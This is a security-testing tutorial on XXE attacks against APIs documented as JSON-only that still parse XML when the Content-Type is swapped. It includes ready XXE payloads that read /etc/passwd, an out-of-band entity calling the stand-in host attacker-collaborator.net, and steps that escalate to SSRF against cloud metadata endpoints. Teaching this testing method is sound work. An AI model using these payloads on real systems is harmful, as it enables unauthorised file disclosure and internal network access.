# XXE via API (Content-Type Confusion on JSON-Default Endpoints)

> Prerequisite: core XXE mechanics (DOCTYPE declaration, external entity definition,
> file disclosure, blind XXE via OOB, SSRF-via-XXE) from the standalone XXE series.
> This file covers a technique that is **entirely specific to APIs**: exploiting XML
> parsing on an endpoint whose documented, intended content type is JSON.

## 1. Why This Technique Is API-Specific

Traditional web app XXE testing targets endpoints that are *known* to accept XML —
a SOAP endpoint, a file upload feature explicitly for XML/SVG/DOCX files, etc. The
API-specific variant covered here is different: it targets endpoints that are
**documented and designed for JSON** but whose underlying web framework still has
XML parsing capability wired in at the content-negotiation layer, either because:

- The framework auto-detects content type from the `Content-Type` header and
  dispatches to a corresponding parser (common in Java/Spring, .NET/ASP.NET Web API,
  and some Python frameworks with content-negotiation middleware) — if an XML parser
  is present anywhere in the dependency tree and registered as a handler, sending
  `Content-Type: application/xml` or `text/xml` to a "JSON-only" endpoint may cause
  the framework to silently switch parsers, even though no API documentation
  mentions XML support at all.
- A shared internal library or middleware handles multiple content types across an
  entire microservice fleet for consistency, meaning an endpoint that *appears*
  JSON-only in its OpenAPI spec may still have XML parsing reachable underneath,
  simply because the library wasn't stripped down per-endpoint.

This is explicitly called out in OWASP's **API Security Top 10** under
**API8:2023 Security Misconfiguration**, which lists accepting unnecessary content
types (including XML where only JSON should be supported) as a specific
misconfiguration pattern leading to XXE.

## 2. The Vulnerable Pattern

```java
// Vulnerable Spring Boot example
@PostMapping(value = "/api/v1/orders", consumes = {"application/json", "application/xml"})
public ResponseEntity<Order> createOrder(@RequestBody Order order) {
    // Spring's default XML unmarshaller (JAXB) has external entity
    // resolution enabled unless explicitly disabled
    return ResponseEntity.ok(orderService.create(order));
}
```

The `consumes` attribute here explicitly lists both `application/json` and
`application/xml` — but even when a JSON-only `consumes` list is declared, some
framework configurations still fall back to a globally registered XML converter
before content-type validation rejects the request, depending on filter/interceptor
ordering. The only way to know for certain is to test empirically.

## 3. Discovery — Testing Whether an Endpoint Accepts XML

### 3.1 Baseline JSON Request

```http
POST /api/v1/orders HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "productId": "1001",
  "quantity": 2
}
```

Normal behavior: `201 Created` with an order confirmation.

### 3.2 Content-Type Swap Test

```http
POST /api/v1/orders HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<order>
  <productId>1001</productId>
  <quantity>2</quantity>
</order>
```

**Breakdown:**

| Fragment | Role |
|---|---|
| `Content-Type: application/xml` | The only change from the baseline — signals to the framework's content negotiation layer that the body should be parsed as XML instead of JSON |
| `<order><productId>...</productId><quantity>...</quantity></order>` | The same logical data as the JSON baseline, restructured as an XML document with matching field names as element tags — this mirrors the JSON structure closely on purpose, maximizing the chance the backend's XML deserializer maps it onto the same internal object the JSON path would have produced |

If this request also returns `201 Created` (or any non-415/406 response indicating
the body was parsed and processed rather than rejected), the endpoint accepts XML
despite JSON being the documented/intended content type — this is the critical
discovery step and should be run against **every** POST/PUT/PATCH endpoint in the
target API systematically, not just ones that seem likely candidates, since this
misconfiguration is often environment-wide (all endpoints sharing the same framework
configuration) or completely inconsistent (only specific endpoints/controllers)
depending on how the codebase evolved.

**Also test:** `Content-Type: text/xml` as a secondary variant — some parsers
register for one MIME type but not the other, so both should be tried independently
before concluding an endpoint rejects XML entirely.

## 4. Basic XXE — File Disclosure Payload Breakdown

Once XML acceptance is confirmed, deliver a standard external entity payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <productId>&xxe;</productId>
  <quantity>2</quantity>
</order>
```

**Breakdown, piece by piece:**

| Fragment | Role |
|---|---|
| `<!DOCTYPE order [ ... ]>` | Declares a Document Type Definition (DTD) for the `order` root element — this is the required wrapper that allows a custom entity to be defined; without a `DOCTYPE` declaration, entity definitions are not permitted by XML syntax at all |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Defines a custom entity named `xxe` whose value is **externally resolved** (`SYSTEM`) from the given URI — here, the local filesystem path `/etc/passwd`. This is the core XXE primitive: the XML parser, if external entity resolution is enabled, will read the file's contents and substitute them wherever `&xxe;` appears |
| `<productId>&xxe;</productId>` | Places the entity reference inside a field the application already expects to process and potentially return/log — repurposing a legitimate-looking field as the injection point so the file contents have a path to become visible in the response (directly, if the field value is echoed back in an error or confirmation response; or indirectly, if it's logged and log access is separately available) |

If the parser resolves the entity and the field's value is reflected anywhere in the
JSON response the API normally sends back (e.g., an order confirmation echoing
`productId`), the contents of `/etc/passwd` (or the parser's error message
containing partial file content, on read failure) will appear in the API's JSON
response — a JSON-formatted API response leaking local file contents obtained via
an XML-only attack vector is the essence of why this content-type confusion
technique matters: the vulnerability surface (XML parser) and the observation
surface (JSON response) are different formats entirely.

## 5. Blind XXE via API — Out-of-Band Exfiltration

Most real-world cases won't reflect the entity value directly. Use OOB techniques,
same principle as file 04 Section 5.2 and file 05 Section 6, step 5 — the
delivery mechanism differs per injection class, but the "confirm via external
callback when no direct feedback exists" pattern is consistent across this entire
series.

```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY % xxe SYSTEM "http://attacker-collaborator.net/xxe-probe">
  %xxe;
]>
<order>
  <productId>1001</productId>
  <quantity>2</quantity>
</order>
```

**Breakdown:**

| Fragment | Role |
|---|---|
| `<!ENTITY % xxe SYSTEM "http://...">` | Defines a **parameter entity** (note the `%` before the entity name) — parameter entities are resolved within the DTD itself, distinct from general entities (like `&xxe;` in Section 4) which are resolved within the document body. Parameter entities are required for OOB techniques because they can trigger the external HTTP/DNS request during DTD parsing, before the document body is even processed |
| `%xxe;` | Invokes the parameter entity, forcing the parser to make an outbound HTTP request to the attacker-controlled collaborator URL to resolve it |

A hit on the Collaborator confirms the parser both accepts XML on this
"JSON-only" endpoint **and** has external entity/network resolution enabled — a
finding with SSRF-equivalent impact (the API server can be forced to make arbitrary
outbound requests) in addition to the file-disclosure/blind-extraction impact.

For full blind file exfiltration (reading file contents out-of-band rather than just
confirming the callback fires), use the standard two-stage parameter entity
technique (external DTD hosting a nested entity that reads the file and appends it to
a callback URL) — this is unchanged from the standalone XXE series' blind extraction
methodology; the only API-specific element is the initial content-type discovery
step covered in Section 3.

## 6. Testing Workflow (Burp)

1. **Systematically test content-type swapping** (Section 3) against every
   state-changing endpoint (POST/PUT/PATCH) in the target API, regardless of whether
   the endpoint "looks like" it should accept XML. Automate this with a short Burp
   extension or a script that replays captured JSON requests with the header and body
   swapped to XML equivalents.
2. On any endpoint that accepts the XML body without a 415/406 rejection, proceed to
   Section 4's basic entity payload targeting a low-sensitivity file first (e.g.,
   `/etc/hostname` rather than `/etc/passwd`, minimizing unnecessary access during
   initial confirmation, consistent with responsible testing practice).
3. If no direct reflection occurs, set up Collaborator/interactsh and run the
   blind/OOB payload (Section 5) to confirm the parser resolves external entities at
   all before investing further effort in full extraction chains.
4. Escalate to full blind file exfiltration or SSRF-via-XXE (using the `SYSTEM`
   entity to target internal-only URLs, e.g., cloud metadata endpoints like
   `http://169.254.169.254/`) only within engagement/program scope and rules of
   engagement.

## 7. PortSwigger Lab Mapping

Complete in this order — these labs teach the core XXE mechanics; apply the
Section 3 content-type-swap discovery step yourself when adapting to a JSON-API
target, since no current lab specifically models that discovery step:

1. **Exploiting XXE using external entities to retrieve files** — maps directly onto
   Section 4's technique.
2. **Exploiting XXE to perform SSRF attacks** — relevant to the SSRF-equivalent
   impact noted in Section 5.
3. **Blind XXE with out-of-band interaction** — maps directly onto Section 5's
   detection technique.
4. **Blind XXE with out-of-band exfiltration via XML parameter entities** — maps onto
   full blind extraction referenced at the end of Section 5.
5. **Exploiting XXE via image file upload** — while not JSON-API-specific, this lab
   is directly relevant to the "framework accepts more content types than
   documented" theme, since it demonstrates XXE reachable through a file format
   (SVG) most testers wouldn't initially suspect, the same "look beyond the
   documented interface" principle this file applies to content-type confusion.

**Gap disclosure:** no PortSwigger lab currently models the specific "documented
JSON-only API endpoint silently also accepts XML via Content-Type header" discovery
technique from Section 3 — this is a technique you apply directly against real API
targets (or purpose-built API security training targets like crAPI/VAmPI, checking
their current lab set for XXE-relevant endpoints) rather than one with a dedicated
lab environment.

## 8. Real-World Notes

- This is one of the more commonly missed findings in API security assessments
  specifically *because* testers trust the OpenAPI/Swagger spec's documented
  `consumes` list at face value and never attempt the content-type swap — treating
  API documentation as a security boundary rather than as a hint about *intended*
  behavior is the single most common reason this class of finding gets missed.
- Java/Spring Boot and .NET-based APIs are disproportionately represented in
  real-world findings of this type, largely because both ecosystems have historically
  shipped XML parsers with external entity resolution **enabled by default**
  (`DocumentBuilderFactory` in Java without explicit `setFeature` hardening calls;
  `XmlDocument`/`XmlReaderSettings` in older .NET Framework versions before secure
  defaults were introduced) — the vulnerability frequently isn't "someone wrote XXE
  code," it's "someone left a framework default unconfigured."
- Always check whether the same content-type-confusion technique applies to file
  **upload** endpoints too, not just JSON body endpoints — an API endpoint accepting
  `multipart/form-data` file uploads for what's documented as "profile picture" or
  "document attachment" functionality may still route SVG, DOCX, or XLSX uploads
  (all of which are XML-based formats internally) through vulnerable XML parsing
  even though the endpoint's primary interface is entirely JSON-based for its other
  fields — this is the file-upload variant referenced by the PortSwigger SVG lab
  above and is worth testing on any API that accepts file uploads alongside its
  primary JSON interface.
